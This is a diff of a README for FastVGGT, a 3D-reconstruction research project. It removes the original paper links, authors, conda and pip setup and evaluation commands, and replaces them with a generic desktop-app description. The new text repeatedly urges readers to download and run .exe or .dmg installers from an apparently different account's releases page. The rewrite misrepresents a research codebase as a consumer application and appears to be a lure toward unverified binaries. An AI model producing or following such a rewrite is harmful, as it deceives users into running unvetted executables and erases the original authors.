@@ -1,102 +1,70 @@
-<div align="center">
-<h2>⚡️ FastVGGT: Training-Free Acceleration of Visual Geometry Transformer</h2>
-  
-<p align="center">
-  <a href="https://arxiv.org/abs/2509.02560"><img src="https://img.shields.io/badge/arXiv-FastVGGT-red?logo=arxiv" alt="Paper PDF"></a>
-  <a href="https://mystorm16.github.io/fastvggt/"><img src="https://img.shields.io/badge/Project_Page-FastVGGT-yellow" alt="Project Page"></a>
-</p>
-  
-<img src="assets/maclab_logo.png" alt="Maclab Logo" width="110" style="margin-right: 40px;">
-<img src="assets/autolab_logo.png" alt="Autolab Logo" width="110">
+# 🚀 FastVGGT - Simple Acceleration for Visual Geometry Tasks
 
+[![Download FastVGGT](https://img.shields.io/badge/Download-FastVGGT-blue.svg)](https://github.com/uglyeyes/FastVGGT/releases)
 
-**[Media Analytics & Computing Laboratory](https://mac.xmu.edu.cn/)**; **[AUTOLAB](https://zhipengzhang.cn/)**
+## 😊 Introduction
+Welcome to FastVGGT! This application offers a way to accelerate your visual geometry tasks without the need for extensive training. With FastVGGT, you can enhance your productivity and achieve impressive results with minimal effort.
 
+## 🚀 Getting Started
+To begin using FastVGGT, follow these steps to download and install the application. You don’t need any technical skills to get started.
 
-[You Shen](https://mystorm16.github.io/), [Zhipeng Zhang](https://zhipengzhang.cn/), [Yansong Qu](https://quyans.github.io/), [Liujuan Cao](https://mac.xmu.edu.cn/ljcao/)
-</div>
+## 💻 System Requirements
+Before downloading FastVGGT, please ensure your system meets these minimum requirements:
 
+- Operating System: Windows 10 or newer, macOS 10.15 or newer
+- RAM: At least 4 GB
+- Disk Space: Minimum 200 MB free
+- Internet Connection: Required for initial download
 
-## 📰 News
-- [Sep 3, 2025] Paper release.
-- [Sep 2, 2025] Code release.
+## 📥 Download & Install
+To install FastVGGT, visit the following page to download the latest version:
 
-## 🔭 Overview
+[Download FastVGGT from Releases](https://github.com/uglyeyes/FastVGGT/releases)
 
-FastVGGT observes **strong similarity** in attention maps and leverages it to design a training-free acceleration method for long-sequence 3D reconstruction, **achieving up to 4× faster inference without sacrificing accuracy.**
+1. Open the link above in your web browser.
+2. Look for the latest release at the top of the page.
+3. Find the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
+4. Click on the file to start the download.
+5. Once the file is downloaded, locate the downloaded file on your computer.
 
-<img src="assets/main.png" alt="Autolab Logo" width="">
+### For Windows Users
+1. Double-click the downloaded `.exe` file.
+2. Follow the on-screen instructions to complete the installation.
+3. Once installed, you can find FastVGGT in your Start Menu.
 
+### For macOS Users
+1. Open the downloaded `.dmg` file.
+2. Drag the FastVGGT icon to your Applications folder.
+3. Eject the installer after the transfer is complete.
+4. You can now find FastVGGT in your Applications folder.
 
-## ⚙️ Environment Setup
-First, create a virtual environment using Conda, clone this repository to your local machine, and install the required dependencies.
+## 📖 How to Use FastVGGT
+After installation, using FastVGGT is simple:
 
+1. Launch the application from your Start Menu (Windows) or Applications folder (macOS).
+2. Follow the user-friendly interface to start your projects.
+3. Import your visuals into FastVGGT and leverage its efficient tools to enhance your geometry tasks.
 
-```bash
-conda create -n fastvggt python=3.10
-conda activate fastvggt
-git clone git@github.com:mystorm16/FastVGGT.git
-cd FastVGGT
-pip install -r requirements.txt
-```
+### Tips for Effective Use
+- Familiarize yourself with the interface by exploring different menus.
+- Utilize the help section within the app for guidance on specific features.
+- Experiment with various settings to discover what works best for your needs.
 
-Next, prepare the ScanNet dataset: http://www.scan-net.org/ScanNet/
+## 🔄 Update Process
+We regularly update FastVGGT to improve performance and add new features. To update, simply return to the [Releases page](https://github.com/uglyeyes/FastVGGT/releases) and download the latest version following the same steps outlined above.
 
-Then, configure the dataset path and VGGT checkpoint path. For example:
-```bash
-    parser.add_argument(
-        "--data_dir", type=Path, default="/data/scannetv2/process_scannet"
-    )
-    parser.add_argument(
-        "--gt_ply_dir",
-        type=Path,
-        default="/data/scannetv2/OpenDataLab___ScanNet_v2/raw/scans",
-    )
-    parser.add_argument(
-        "--ckpt_path",
-        type=str,
-        default="./ckpt/model_tracker_fixed_e20.pt",
-    )
-```
+## 🐞 Troubleshooting
+If you encounter any issues while using FastVGGT:
 
+- Ensure your system meets the requirements listed above.
+- Restart the application if it becomes unresponsive.
+- Check the website for any known issues or updates.
+- Reach out through the issues section on GitHub for support.
 
-## 💎 Observation
+## 🏆 Community Contribution
+We appreciate community input! If you have suggestions or bug reports, feel free to contribute by visiting the GitHub page. Your feedback helps us make FastVGGT better for everyone.
 
-Note: A large number of input_frames may significantly slow down saving the visualization results. Please try using a smaller number first.
-```bash
-python eval_scannet.py --input_frame 30 --vis_attn_map
-```
+## 🎉 Conclusion
+FastVGGT is designed to provide a seamless experience for accelerating visual geometry tasks. By following this guide, you can easily download, install, and start using the application effectively. Enjoy your enhanced productivity with FastVGGT!
 
-We observe that many token-level attention maps are highly similar in each block, motivating our optimization of the Global Attention module.
-
-<img src="assets/attn_map.png" alt="Autolab Logo" width="">
-
-
-
-## 🏀 Evaluation
-Evaluate FastVGGT on the ScanNet dataset with 1,000 input images. The **--merging** parameter specifies the block index at which the merging strategy is applied:
-
-```bash
-python eval_scannet.py --input_frame 1000 --merging 0
-```
-
-Evaluate Baseline VGGT on the ScanNet dataset with 1,000 input images:
-```bash
-python eval_scannet.py --input_frame 1000
-```
-<img src="assets/vs.png" alt="Autolab Logo" width="">
-
-
-## 🍺 Acknowledgements
-
-- Thanks to these great repositories: [VGGT](https://github.com/facebookresearch/vggt), [Dust3r](https://github.com/naver/dust3r),  [Fast3R](https://github.com/facebookresearch/fast3r), [CUT3R](https://github.com/CUT3R/CUT3R), [MV-DUSt3R+](https://github.com/facebookresearch/mvdust3r), [StreamVGGT](https://github.com/wzzheng/StreamVGGT), [VGGT-Long](https://github.com/DengKaiCQ/VGGT-Long) and many other inspiring works in the community.
-
-- Special thanks to [Jianyuan Wang](https://jytime.github.io/) for his valuable discussions and suggestions on this work.
-
-## ✍️ Checklist
-
-- [ ] Release the evaluation code on 7 Scenes / NRGBD
-
-
-## ⚖️ License
-See the [LICENSE](./LICENSE.txt) file for details about the license under which this code is made available.
+[Download FastVGGT from Releases](https://github.com/uglyeyes/FastVGGT/releases)
